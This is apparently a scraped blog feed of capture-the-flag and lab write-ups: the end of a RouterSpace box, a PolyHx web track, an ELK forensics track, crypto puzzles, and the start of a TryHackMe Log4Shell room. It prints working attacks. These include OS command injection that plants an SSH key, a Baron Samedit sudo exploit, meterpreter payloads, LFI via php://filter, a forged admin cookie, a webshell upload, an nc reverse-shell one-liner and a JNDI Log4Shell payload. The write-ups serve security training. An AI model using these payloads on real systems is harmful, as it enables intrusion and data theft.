[P.], seq 1:253, ack 278, win 65535, length 252: HTTP: HTTP/1.1 200 OKE..$....?..........P.......jW.P...MQ..HTTP/1.1 200 OKX-Powered-By: RouterSpaceX-Cdn: RouterSpace-42726Content-Type: application/json; charset=utf-8Content-Length: 11ETag: W/&quot;b-ANdgA/PInoUrpfEatjy5cxfJOCY&quot;Date: Tue, 08 Mar 2022 20:08:05 GMTConnection: keep-alive&quot;0.0.0.0\\n&quot;14:52:06.769628 IP 192.168.250.2.53172 &amp;gt; routerspace.htb.http: Flags [.], ack 253, win 63988, length 0E..(..@.@..m.........P.jW.....P....c..14:52:09.688862 IP 192.168.250.2.53172 &amp;gt; routerspace.htb.http: Flags [F.], seq 278, ack 253, win 63988, length 0E..(..@.@..l.........P.jW.....P....c..14:52:09.689054 IP routerspace.htb.http &amp;gt; 192.168.250.2.53172: Flags [.], ack 279, win 65535, length 0E..(....?..........P.......jW.P....o..14:52:09.712759 IP routerspace.htb.http &amp;gt; 192.168.250.2.53172: Flags [F.], seq 253, ack 279, win 65535, length 0E..(....?..........P.......jW.P....n..14:52:09.712795 IP 192.168.250.2.53172 &amp;gt; routerspace.htb.http: Flags [.], ack 254, win 63988, length 0E..(..@.@.j..........P.jW.....P...%y..^C11 packets captured11 packets received by filter0 packets dropped by kernelBetween the TCP syn/ack garbage, we can see the actual HTTP requests that are made and the answers (thanks to httpwithoutans)The application is interacting with an api endpoint on the target machine and send a json payload with an ip of 0.0.0.0. Server replies with “0.0.0.0”It’s time to replay this request in Burp Suite to see what I can get from it. After a lot of fuzzing, I found an os command injection vulnerability.If I send this payload :{&quot;ip&quot;:&quot;0.0.0.0.;id&quot;}Server replies with :&quot;0.0.0.0\\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\\n&quot;Confirming RCE through os command injectionExploitation &amp;amp;&amp;amp; FootholdI tried many many many ways to get a reverse shell, but the target just can’t reach attacker’s machine.To get a foothold, I had to inject a public key into /home/paul/.ssh/authorized_keys then connect to the target using the private key :POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1Host: 10.10.11.148Accept: */*User-Agent: RouterSpaceAgentContent-Type: application/jsonContent-Length: 609Connection: close{&quot;ip&quot;:&quot;0.0.0.0;echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAA[...redacted...]pmUNA7G/flYc=&#39;&amp;gt;&amp;gt;/home/paul/.ssh/authorized_keys&quot;}$ ssh paul@$ip -i ./id_rsapaul@routerspace:~$ cat user.txt(REDACTED)Privilege EscalationWithout MetasploitLike I said before, this VM can’t do egress connection. Before trying to send the good old linpeas.sh, I tried some tricks manually : suid binary, cron jobs, sudo version etc..The box has sudo v1.8.31 installed:paul@routerspace:/tmp/h3xit$ sudo -VSudo version 1.8.31Sudoers policy plugin version 1.8.31Sudoers file grammar version 46Sudoers I/O plugin version 1.8.31Luckily, this version of sudo is vulnerable to CVE-2021-3156 (Baron Samedit)I tried an exploit:paul@routerspace:/tmp/h3xit$ makerm -rf libnss_Xmkdir libnss_Xgcc -std=c99 -o sudo-hax-me-a-sandwich hax.cgcc -fPIC -shared -o &#39;libnss_X/P0P_SH3LLZ_ .so.2&#39; lib.cpaul@routerspace:/tmp/h3xit$ ./sudo-hax-me-a-sandwich 1** CVE-2021-3156 PoC by blasty &amp;lt;peter@haxx.in&amp;gt;using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 [&#39;/usr/bin/sudoedit&#39;] (56, 54, 63, 212)** pray for your rootshell.. **[+] bl1ng bl1ng! We got it!# id uid=0(root) gid=0(root) groups=0(root),1001(paul)# cat /root/root.txt(REDACTED)With MetasploitFor the fun of it, I wanted to find a way to send a metasploit payload and get a meterpreter session, even though the target can’t egress.To do it, I had to setup a reverse port forwarding with ssh :$ ssh -R 4444:127.0.0.1:4444 paul@10.10.11.148 -i ./id_rsaThen, with msfvenom, I created a payload that connect to 127.0.0.1 and scp it to the target:$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o mp$ scp -i ./id_rsa ./mp paul@2.2.2.2:/tmp/h3xit/mpNow, let’s start msfconsole and setup a listener for the payload, then run it from the target:# on attacker machine$ msfconsolemsf6 &amp;gt; use multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set payload linux/x64/meterpreter/reverse_tcppayload =&amp;gt; linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set lhost 127.0.0.1lhost =&amp;gt; 127.0.0.1msf6 exploit(multi/handler) &amp;gt; set lport 4444lport =&amp;gt; 4444msf6 exploit(multi/handler) &amp;gt; run[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?[*] Started reverse TCP handler on 127.0.0.1:4444# on targetpaul@routerspace:~$ /tmp/h3xit/mp &amp;amp;[1] 49179# then on attacker machine[*] Started reverse TCP handler on 127.0.0.1:4444 [*] Sending stage (3020772 bytes) to 127.0.0.1[*] Meterpreter session 1 opened (127.0.0.1:4444 -&amp;gt; 127.0.0.1:57130 ) at 2022-03-14 00:40:38 +0000meterpreter&amp;gt; bgmsf6&amp;gt; use exploit/linux/local/sudo_baron_sameditmsf6 exploit(linux/local/sudo_baron_samedit) &amp;gt; set lhost 127.0.0.1msf6 exploit(linux/local/sudo_baron_samedit) &amp;gt; set session 1msf6 exploit(linux/local/sudo_baron_samedit) &amp;gt; run[!] SESSION may not be compatible with this module:[!] * missing Meterpreter features: stdapi_railgun_api[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?[*] Started reverse TCP handler on 127.0.0.1:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)[*] Writing &#39;/tmp/weDXz.py&#39; (763 bytes) ...[*] Writing &#39;/tmp/libnss_s8xoK/D .so.2&#39; (548 bytes) ...[*] Sending stage (3020772 bytes) to 127.0.0.1[+] Deleted /tmp/weDXz.py[+] Deleted /tmp/libnss_s8xoK/D .so.2[+] Deleted /tmp/libnss_s8xoK[*] Meterpreter session 2 opened (127.0.0.1:4444 -&amp;gt; 127.0.0.1:57132 )meterpreter &amp;gt; shellProcess 49282 created.Channel 1 created.id &amp;amp;&amp;amp; hostnameuid=0(root) gid=0(root) groups=0(root),1001(paul)routerspace.htbThanks to ssh tunelling, I’m able to use almost all metasploit’s modules.Thanks for reading &amp;lt;3h3x" }, { "title": "24H@CTF - Jamais Sans Mon Riz", "url": "/posts/polyctf-jamaissansmonriz/", "categories": "polyctf", "tags": "linux, privilege escalation, lfi, rce, php", "date": "2022-02-15 00:00:00 -0500", "snippet": "Challenge Description“Jamais sans mon riz” was the web track designed by Desjardins at the 2022 edition of PolyHx’s 24H@CTFAt the time or writing this, the challenge was still available at http://www.jamaissansmonriz.comFlag #1We are presented with a blog about rice. I started by browsing the site manually. Quickly, something catches my attention: links to blog post are in the form of /post.php?postid=posts/1.php. This looks good for a potential LFI vulnerability.I continued looking for the “classics” and found the first flag in the good old robots.txtUser-agent: * Disallow: /admin/FLAG{1_dur_dur_detre_un_robot}Flag #2Now that I have flag #1, I continued to look at source code and some other things without finding anything else useful, I went back to this potential LFI.I started by trying to include a file that I know it exists and that I have read permission, robots.txt and it worked. The content of the file showed up in the source :/post.php?postid=robots.txtThen I tried to include passwd file which is outside the site root folder. Again, it worked :/post.php?postid=/etc/passwdNext thing I wanted to see was the site PHP source. But if I include the file through LFI, PHP code will be executed by the server so I wont be able to see what I want to see. So I used php filters to encode the content/post.php?postid=php://filter/convert.base64-encode/resource=index.phpThis will give me a base64 string which I decoded with :echo &#39;BIGDIRTYBASE64STRING&#39;|base64 -d &amp;gt; index.phpThe decoded string is the actual PHP file. I remembered seeing an admin endpoint in the robots.txt file. I browsed to that endpoint and got redirected to /admin/login.php. By doing the same thing I did for index.php, I got the source for that login page.At the top of the page were a comment with the second flag:&amp;lt;?php// FLAG{2_je_me_sens_tellement_inclu}include_once(&quot;lib/crypto.php&quot;);session_start();if(isset($_SESSION[&quot;admin&quot;]) &amp;amp;&amp;amp; $_SESSION[&quot;admin&quot;]) { header(&quot;Location: /admin/index.php&quot;); exit();}// Validate Remember Meif(isset($_COOKIE[&quot;remember_me&quot;])) { if ($remember_me = validate_remember_me_cookie($_COOKIE[&quot;remember_me&quot;])) { $_SESSION[&quot;admin&quot;] = true; $_SESSION[&quot;username&quot;] = &quot;admin&quot;; header(&quot;Location: /admin/index.php&quot;); exit(); }}// Validate loginif(isset($_POST[&quot;email&quot;]) &amp;amp;&amp;amp; isset($_POST[&quot;password&quot;])) { // TODO: Ajouter une base de donnees, comme ca on ne riz plus if($_POST[&quot;email&quot;] === &quot;admin@jamaissansmonriz.com&quot; &amp;amp;&amp;amp; $_POST[&quot;password&quot;] === getenv(&quot;FLAG4&quot;)) { $_SESSION[&quot;admin&quot;] = true; $_SESSION[&quot;username&quot;] = &quot;admin&quot;; if(isset($_POST[&quot;remember_me&quot;]) &amp;amp;&amp;amp; $_POST[&quot;remember_me&quot;] === &quot;on&quot;) { setcookie(&quot;remember_me&quot;, generate_remember_me_cookie($_SESSION[&quot;username&quot;], &quot;1&quot;), time()+3600*24*30, &quot;/&quot;, &quot;&quot;, 0); } header(&quot;Location: /admin/index.php&quot;); exit(); }}?&amp;gt;We also have the code that validate the “remember me” cookie and the login validation itself. We know the admin email address and that the password is stored in an environment variable. We’ll get back to this later.Flag #3Let’s go back to the source of login.php.The website does validate a “remember me” cookie :// Validate Remember Meif(isset($_COOKIE[&quot;remember_me&quot;])) { if ($remember_me = validate_remember_me_cookie($_COOKIE[&quot;remember_me&quot;])) { $_SESSION[&quot;admin&quot;] = true; $_SESSION[&quot;username&quot;] = &quot;admin&quot;; header(&quot;Location: /admin/index.php&quot;); exit(); }}What this piece of code do is look for a cookie named “remember_me” and calls a function named “validate_remember_me_cookie”. If the cookie is validated, the user’s session is set to admin.We can see in the source that it includes lib/crypto.php. Let’s follow that trail and look at this one/post.php?postid=php://filter/convert.base64-encode/resource=admin/lib/crypto.phpThis one is interesting :&amp;lt;?php$key = &quot;5UP3R_S3CURE,K3Y&quot;;$cipher=&quot;AES-128-CBC&quot;;function generate_remember_me_cookie($username, $admin) { $iv = substr(md5(mt_rand()), 0, 16); $t = time() + (3600 * 24 * 365); $data = $username . &quot;|&quot; . $t . &quot;|&quot; . $admin; return base64_encode(encrypt($data, $iv) . &quot;|&quot; . $iv);}function validate_remember_me_cookie($cookie) { global $key, $cipher; try { $cookie_expended = explode(&quot;|&quot;, base64_decode($cookie)); $decrypted_cookie = decrypt($cookie_expended[0], $cookie_expended[1]); if(!$decrypted_cookie) { return false; } $exp_d_cookie = explode(&quot;|&quot;, $decrypted_cookie); if ($exp_d_cookie[1] &amp;lt; time()) { return false; } // TODO: Ajouter des comptes user if ($exp_d_cookie[2] != &quot;1&quot;) { return false; } } catch (Exception $e) { throw $e; return false; } return $exp_d_cookie;}function encrypt($data, $iv) { global $key, $cipher; // $ciphertext_raw = openssl_encrypt($data, $cipher, $key, 0, $iv); // return base64_encode(ciphertext_raw); return openssl_encrypt($data, $cipher, $key, 0, $iv);}function decrypt($cookie, $iv) { global $key, $cipher; // $ciphertext_raw = base64_decode($cookie); // return openssl_decrypt($ciphertext_raw, $cipher, $key, 0, $iv); return openssl_decrypt($cookie, $cipher, $key, 0, $iv);}?&amp;gt;I quickly realised that the functions in this file are the ones responsible for generating and validating “remember me” cookie. Both the key and the cipher used are also there. I had everything I needed to craft myself a cookie.I started by launching a php-cli container and copied the file content (without the first and last lines) in the console to load the functions :$ docker run --rm -it php Interactive shellphp &amp;gt; $key = &quot;5UP3R_S3CURE,K3Y&quot;;$cipher=&quot;AES-128-CBC&quot;;function generate_remember_me_cookie($username, $admin) { $iv = substr(md5(mt_rand()), 0, 16); $t = time() + (3600 * 24 * 365); $data = $username . &quot;|&quot; . $t . &quot;|&quot; . $admin;[...]php &amp;gt; echo generate_remember_me_cookie(&#39;admin&#39;,1);RVVCK1I1WFFwN3k3a2lRTW1tN1pBSm5WZHRod2pmS1Y2eEtmVnR4Wmd5RT18OGNjNDY4MWE3ZDVmNTg4Nw==Now all I had to do is set this cookie in my browser to access the admin page :I browsed to /admin/login.php, opened developper tools (f12), go to console tab and run the command:document.cookie=&#39;remember_me=RVVCK1I1WFFwN3k3a2lRTW1tN1pBSm5WZHRod2pmS1Y2eEtmVnR4Wmd5RT18OGNjNDY4MWE3ZDVmNTg4Nw==&#39;When the page is reloaded, we’re in the admin dashboard:Flag #4I already know that the 4th flag is in an environment variable. I must find a way to access those variables.I tried to get RCE through log poisoning but I couldn’t access any log file. There must be another way to get RCE. I also tried to access the environment variable from /proc/self/environ with no luck.I started by browsing the admin dashboard and found a file upload page. Thanks to LFI, we can see the code that’s responsible for the upload :/post.php?postid=php://filter/convert.base64-encode/resource=admin/upload.php&amp;lt;?php if (isset($_FILES[&#39;file&#39;])) { $uploaddir = &#39;/var/www/uploads/&#39; . session_id() . &#39;/&#39;; $path_parts = pathinfo($_FILES[&#39;file&#39;][&#39;name&#39;]); $filename = $path_parts[&#39;basename&#39;]; $valid_ext = [&quot;jpg&quot;, &quot;png&quot;]; if(in_array($path_parts[&#39;extension&#39;], $valid_ext, true)) { if (!file_exists($uploaddir)) { mkdir($uploaddir, 0755, true); } $uploadfile = $uploaddir . $filename; if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) { echo &#39;&amp;lt;div class=&quot;alert alert-success&quot; role=&quot;alert&quot;&amp;gt; File is valid, and was successfully and securely uploaded.&amp;lt;/div&amp;gt;&#39;; } else { echo &#39;&amp;lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&amp;gt;What did you do... I\\&#39;m not mad, I\\&#39;m just disappointed...&amp;lt;/div&amp;gt;&#39;; } } else { echo &#39;&amp;lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&amp;gt;What did you do... I\\&#39;m not mad, I\\&#39;m just disappointed...&amp;lt;/div&amp;gt;&#39;; } }?&amp;gt;By analysing the code, I can tell that the only validation that’s done on the uploaded file is an extension check and that the file is saved in uploads/sessionsid/file.png. We should be able to run some PHP codeI fired up Burp Suite to edit the upload POST request to remove the image and include some PHP code :With my file uploaded, I should be able to get to it using LFI :/post.php?postid=../uploads/c26452f59a9ce0ef22dd3a400aed40c2/cochondinde.jpgYay! The next thing I did was to upload a proper webshell. I used this one. To do this, I just repeated my first upload POST in Burp Suite and replaced the code with the webshell.I went back to my browser and refresh the page to get my shell and the 4th flag :Flag #5The 4th flag is asking us to become root. Let’s do that.With a working webshell, I should be able to get a proper reverse shell by running the following command:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&amp;gt;&amp;amp;1|nc vps_hostname 4444 &amp;gt;/tmp/fI now have a reverse shell as www-data user. Next, I started to look for privilege escalation vector. I looked for the classic vectors : cron jobs writable folder suid binariesThen I found a suid binary right at server root :$ ls -la /total 112drwxr-xr-x 1 root root 4096 Feb 16 13:44 .drwxr-xr-x 1 root root 4096 Feb 16 13:44 ..-rwxr-xr-x 1 root root 0 Feb 16 13:44 .dockerenvdrwxr-xr-x 1 root root 4096 Feb 16 13:14 bindrwxr-xr-x 2 root root 4096 Feb 1 2020 bootdrwxr-xr-x 5 root root 340 Feb 16 13:44 devdrwxr-xr-x 1 root root 4096 Feb 16 13:44 etcdrwxr-xr-x 1 root root 4096 Feb 9 04:23 homedrwxr-xr-x 1 root root 4096 Feb 26 2020 libdrwxr-xr-x 2 root root 4096 Feb 24 2020 lib64drwxr-xr-x 2 root root 4096 Feb 24 2020 mediadrwxr-xr-x 2 root root 4096 Feb 24 2020 mnt-rw-r--r-- 1 root root 127 Feb 9 03:50 my_very_special_script.c-rwsr-sr-x 1 root root 16680 Feb 16 13:14 my_very_special_script.odrwxr-xr-x 2 root root 4096 Feb 24 2020 optdr-xr-xr-x 439 root root 0 Feb 16 13:44 procdrwx------ 1 root root 4096 Feb 26 2020 rootdrwxr-xr-x 1 root root 4096 Feb 26 2020 rundrwxr-xr-x 1 root root 4096 Feb 26 2020 sbindrwxr-xr-x 2 root root 4096 Feb 24 2020 srvdr-xr-xr-x 13 root root 0 Feb 15 13:29 sysdrwxrwxrwt 1 root root 4096 Feb 16 13:44 tmpdrwxr-xr-x 1 root root 4096 Feb 24 2020 usrdrwxr-xr-x 1 root root 4096 Feb 26 2020 varWe have an executable file and the source code :$ cat /my_very_special_script.c#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main() { setuid(1000); system(&quot;touch /tmp/hello_world&quot;); return 0; }I immediately spooted the “pathless” call to touch. The fact that “touch” is called without a full path means that I should be able to add a folder to my PATH and hijack the real “touch” with a custom script :First, I tested the theory :$ mkdir /tmp/h3xit$ cd /tmp/h3xit$ export PATH=/tmp/h3xit:$PATH$ which touch/usr/bin/touch$ echo &#39;echo &quot;path manipulation ftw&quot;&#39; &amp;gt; touch $ chmod +x touch$ which touch/tmp/touch$ touchpath manipulation ftwIt worked, so let’s setup the real thing :$ echo -e &#39;#!/bin/bash\\n/bin/bash&#39; &amp;gt; touch$ cat touch#!/bin/bash/bin/bash$ chmod +x touch$ /my_very_special_script.oiduid=1000(admin) gid=33(www-data) groups=33(www-data)$ ls -l /home/admintotal 4-rw-r--r-- 1 root root 35 Feb 9 04:23 flag.txt$ cat /home/admin/flag.txtFLAG{5_la_track_est_enfin_finie_gj}Thanks for reading &amp;lt;3h3x" }, { "title": "24H@CTF - I&#39;m Blue da ba dee da ba di", "url": "/posts/polyctf-blue/", "categories": "polyctf", "tags": "", "date": "2022-02-07 00:00:00 -0500", "snippet": "Challenge DescriptionI’m Blue da ba dee da ba di was the “blue team” track of the 2022 edition of PolyHx’s 24H@CTF that tooks place on 2022-02-06.We are placed in a scenario where we must investigate a malware event that occured on february 2nd using the ELK tool.I never used this tool before, so I was prepared to take quite some time to browse the tool and find what I need to find.Let’s get startedFlag #1 - Collection/Exfiltration (Query)The first flag was in fact the SQL query used by the threat actor to get the data that’s been exfiltratedFirst things first, let’s set our timeframe : Security &amp;gt; Overview &amp;gt; Top Right : Click “Update”Now we can look at the security overview to see some alerts relative to our investigation :imblue5.pngLet’s take a look at the hosts Security &amp;gt; Explore &amp;gt; HostsWe have 3 hosts listed : colelktor : 10.0.2.6 criticaldb01 : 10.0.2.4 DESKTOP-TJ2UCGM : 10.0.2.5colelktor is, well.. the elk collectorcriticaldb is a posgresql serverDESKTOP-TJ2UCGM is a Windows workstationLet’s recap : we are looking for a SQL query that’s been used to get some data from, obviously, a database server. Let’s take a look at the processes on the workstation : Security &amp;gt; Explore &amp;gt; Hosts &amp;gt; DESKTOP-TJ2UCGM &amp;gt; Uncommon ProcessesGoing through the list of processes, there is one that got my attention :legit_teams_updater.exe. Doesnt sound so legit to me.Let’s inspect that process Click on the “event” tab, and set a filter on the top filter bar then click on refresh:process.name : &quot;legit_teams_updater.exe&quot;In the event tab, sort the events on the timestamp column and take a look a the events :Our so called teams updater actually made connection with our precious criticaldb01, which is suspicious for a software update…I tried to get more details from the event tab, but I haven’t been able to get any. I decided to create a timeline investigation Security &amp;gt; Investigate &amp;gt; Timeline &amp;gt; Create new timeline Add process filter like aboveWe now have a nice chronologic event list about what our process didSince we’re looking for a SQL query, let’s try to narrow down our list by entering a new filter :process.name : &quot;legit_teams_updater.exe&quot; and destination.ip : 10.0.2.4We can’t find any queries yet but we can see that there was a connection to the database server using ssh.It’s not clear at this point how the credentials for criticaldb01 were known, but we’ll see later.Let’s see what happened on the server. We’ll focus our attention on the sshd process, which should be the first one on the process tree that we’re looking for. Set the filter to :process.pid : 20373and click “Analyze event” on the first one in the listWe have the whole process tree telling us a good story about what happened:After looking around the tree a lot, I found the process #20439, lessecho, which is called by psql. Process info shows the query :The query was : select * from credit_infosFlag #2 - Collection/Exfiltration (User)The flag #2 was the username that was used to do the query. We already have the answer in the lessecho process in the field user.name : that_db_guyFlag #3 - Lateral MovementFor this one we had to find the ip and hostname of the machine that’s been used for lateral movement.From our work on flag #1, we already know the answer : 10.0.2.4/criticaldb01Flag #4 - Credential Access (Bonus)The question for flag #4 was the name of the file containing the credentials for criticaldb01. To find this one, I tried to add some filters before the initial ssh connection, to pin point the file. I ended up with this filter :process.name : &quot;legit_teams_updater.exe&quot; and destination.ip : 10.0.2.4 or (event.category : file and file.name : *pass*)The filename was : mes_petits_mots_de_passe.txt.txtFlag #5For this one, we had to find the PID of the process that ran a port scan. We had a starting filter to start our research :event.category : network and event.action : connection_attemptedAround 18:14:00, we can see multiple connection attempts on criticaldb01 :Those connection attempts were done by our not so legit legit_teams_updater.exe.The answer was : 1832Flag #6 - PersistenceFor flag #6, we had to find the registry key that was used to establish persistence.Knowing how to autorun programs on startup using the registry, I know that the registry path must contains the word “Run”. Let’s try this filter :event.category : registry and event.action : modification and registry.path : *Run* and user.name : Employee46Bingo! :The answer was : HKEY_USERS\\S-1-5-21-2139450840-2415775787-1042386588-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\legit_teams_updaterFlag #7 - Initial Access/ExecutionFor the last flag, we had to find the malicious file that was originally downloaded by the user.Again, I tried a couple filter to finish with this one :event.category : file and event.action : creation and file.path : *Downloads*The answer was : teams_update.zipConclusionI had a lot of fun doing this track. Like I said, I neved used ELK before so it was a good thing to learn something new.My guess on the events: User download malicious team updater and executes it Malicious updater download a Metasploit Payload Threat actor establish foothold and persistence Threat actor finds the credential file Threat actor move laterally to criticaldb01 Threat actor do some enumeration on the server Threat actor find database and get sensitive data from it Threat actor exfiltrate the data with curl to a controlled endpointSince we could not save our timeline within the tool, I did my own to help me during the investigation:" }, { "title": "24H@CTF - Crypto", "url": "/posts/polyctf-crypto/", "categories": "polyctf", "tags": "", "date": "2022-02-07 00:00:00 -0500", "snippet": "Crypto #1Content of the challenge file:Open with text editor:I did a regex find/replace (.[[0-9]{1,2}m). There was probably a better/cleaner way but it worked and it was quickL&#39;Écolecyber est un organisme à but non lucratif dont la mission est de développer le talent en sécurité au Québec. L&#39;équipe est composée de personnes passionnées par le domaine de la sécurité et de l&#39;éducation. Nous aimons transmettre notre passion et nous déployons bénévolement beaucoup d&#39;efforts pour accomplir notre mission. FLAG{dbabd604f47b0acd8fd6f43632023a96}Crypto #2Content of the challenge file:This is actually 3 string. Each letters of the same color = the stringIf we open the file in a text editor, it looks like the first file :Each color is represented by a code :Red: ^[31mGreen: ^[32mYellow: ^[33mAfter manually splitting the colors, I ended up with 3 string with 3 parts of the flag at the end:Red: L&#39;Écolecyberoffrelacertificationsurlasécuritéducode.Celui-cipermetd&#39;apprendrelesbonnespratiquesendéveloppemendecodepourécrireducodesécuritaire.FLAG{8a19be3eadGreen: L&#39;ÉcolecyberoffreégalementlacertificationdeSécuritéWeb.Celle-cipermetdeformeretd&#39;enrichirsesconnaissancesenmatièredevulnérabilitésweb.9bb6733e5Yellow: L&#39;ÉcolecyberoffreégalementsanouvelleformationCTF101pourrendreaccessibleàtouslescompétitionsdeCaptureTheFlag.4dce15d8ee312}Flag: FLAG{8a19be3ead9bb6733e54dce15d8ee312}Crypto #3Content of the challenge file:It looks like nothing. Let’s zoom out the terminal :" }, { "title": "Try Hack Me - Lumberjack Turtle", "url": "/posts/thm-lumberjack-turtle/", "categories": "tryhackme", "tags": "linux, java, log4shell, docker", "date": "2022-01-25 00:00:00 -0500", "snippet": "Challenge descriptionhttps://tryhackme.com/room/lumberjackturtleReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 -- -A -sC.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[...]PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCnZPtl8mVLJYrSASHm7OakFUsWHrIN9hsDpkfVuJIrX9yTG0yhqxJI1i8dbI/MrexUGrIGzYbgLpYgKGsH4Q4dxB9bj507KQaTLWXwogdrkCVtP0WuGCo2EPZKorU85EWZAhrefG1Pzj3lAx1IdaxTHIS5zTqEJSZYttPF4BHb2avjKDVfSA+4cLP7ybq0rgohJ7JLG5+1dR/ijrGpaXnfudm/9BVjiKcGMlENS6bQ+a32Fs7wxL5c7RfKoR0CjA+pROXrOj5blQM4CI4wrEdphPZ/900I4DJ+kA6Ga+NJF6donQOmmhjsEEpI6RYcz6n/4ql1bomnyyI+jayyf3t| 256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPkLzZd9EQTP/90Y/G1/CYr+PGrh376Qm6aZTO0HZ7lCZ0dExE834/QZ1vNyQPk4jg1KmS09Mzjz1UWWtUCYLg=| 256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdrmxj3Q5Et6BwEm7pC8cz5louqLoEAwNXGHi+3ee+t80/tcp open nagios-nsca syn-ack Nagios NSCA|_http-title: Site doesn&#39;t have a title (text/plain;charset=UTF-8).| http-methods: |_ Supported Methods: GET HEAD OPTIONSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe have a web server, apparantly nagio ncsa, running on port 80, which is unusual for this service that is normally running on port 5667 and a SSH server on port 22.Web EnumerationThere’s nothing more than the home page that says : What you doing here? There is nothing for you to C. Grab a cup of java and look deeper.After scratching my head for 10-15 minutes I tought about the room description : What do lumberjacks and turtles have to do with this challenge?Hack into the machine. Get root. You’ll figure it out.Lumberjack / Logging / Logs + Turtle / Shell = Log4ShellSo I launched a listener on ldap port (1389) and started fuzzing HTTP headers using Burp Suite. It didn’t take long to get a hit, actually it worked on the first try, accept header :$ nc -lnvp 1389 listening on [any] 1389 ...connect to [1.1.1.1] from (UNKNOWN) [10.10.105.211] 352440 `�^CIt means we should be able to exploit this and get a foothold on the targetExploitationTo exploit the log4shell vulnerability, I used a POC script by github’s kozmerinstructions source$ git clone https://github.com/kozmer/log4j-shell-pocCloning into &#39;log4j-shell-poc&#39;...remote: Enumerating objects: 205, done.remote: Counting objects: 100% (202/202), done.remote: Compressing objects: 100% (119/119), done.remote: Total 205 (delta 74), reused 167 (delta 65), pack-reused 3Receiving objects: 100% (205/205), 40.36 MiB | 73.67 MiB/s, done.Resolving deltas: 100% (74/74), done.$ cd log4j-shell-poc &amp;amp;&amp;amp; wget https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz&amp;amp; tar xvzf jdk-8u202-linux-x64.tar.gz&amp;amp; sudo mv jdk1.8.0_202 /usr/bin/# we need to edit the script to fit jdk version/path$ sed -i &#39;s/jdk1.8.0_20/\\/usr\\/bin\\/jdk1.8.0_202/&#39; poc.py$ python3 poc.py --userip 1.1.1.1 --webport 8000 --lport 4444[!] CVE: CVE-2021-44228[!] Github repo: https://github.com/kozmer/log4j-shell-poc[+] Exploit java class created success[+] Setting up LDAP server[+] Send me: ${jndi:ldap://1.1.1.1:1389/a}[+] Starting Webserver on port 8000 http://0.0.0.0:8000Listening on 0.0.0.0:1389In another terminal, start a netcat listener on port 4444: nc -lnvp 4444 listening on [any] 4444 ...We just need to repeat the request with Burp Suite to get a shellSend LDAP reference result for a redirecting to http://1.1.1.1:8000/Exploit.class10.10.105.211 - - [24/Jan/2022 03:56:42] &quot;GET /Exploit.class HTTP/1.1&quot; 200 -connect to [1.1.1.1] from (UNKNOWN) [10.10.105.211] 55104id &amp;amp;&amp;amp; hostnameuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)81fbbf1def70We got a reverse shell on the target as root in what seems to be a docker container. Let’s confirm this by checking for .dockerenv file :ls -la /total 68drwxr-xr-x 1 root root 4096 Dec 13 01:26 .drwxr-xr-x 1 root root 4096 Dec 13 01:26 ..-rwxr-xr-x 1 root root 0 Dec 13 01:25 .dockerenvWhile we are here, let’s get our first flag :ls -la /opttotal 12drwxr-xr-x 1 root root 4096 Dec 11 21:04 .drwxr-xr-x 1 root root 4096 Dec 13 01:26 ..-rw-r--r-- 1 root root 19 Dec 11 21:04 .flag1cat /opt/.flag1THM{REDACTED}Container EscapeSo we are in a container, we now need to escape !Let’s start by listing disks :ls -la /dev | grep disk[...]brw-rw---- 1 root disk 202, 0 Jan 24 01:15 xvdabrw-rw---- 1 root disk 202, 1 Jan 24 01:15 xvda1brw-rw---- 1 root disk 202, 80 Jan 24 01:15 xvdfbrw-rw---- 1 root disk 202, 112 Jan 24 01:15 xvdhInteresting, let’s try to mount those disks :mkdir /mnt/hostmount /dev/xvda1 /mnt/hostls -la /mnt/hosttotal 100drwxr-xr-x 22 root root 4096 Jan 24 01:14 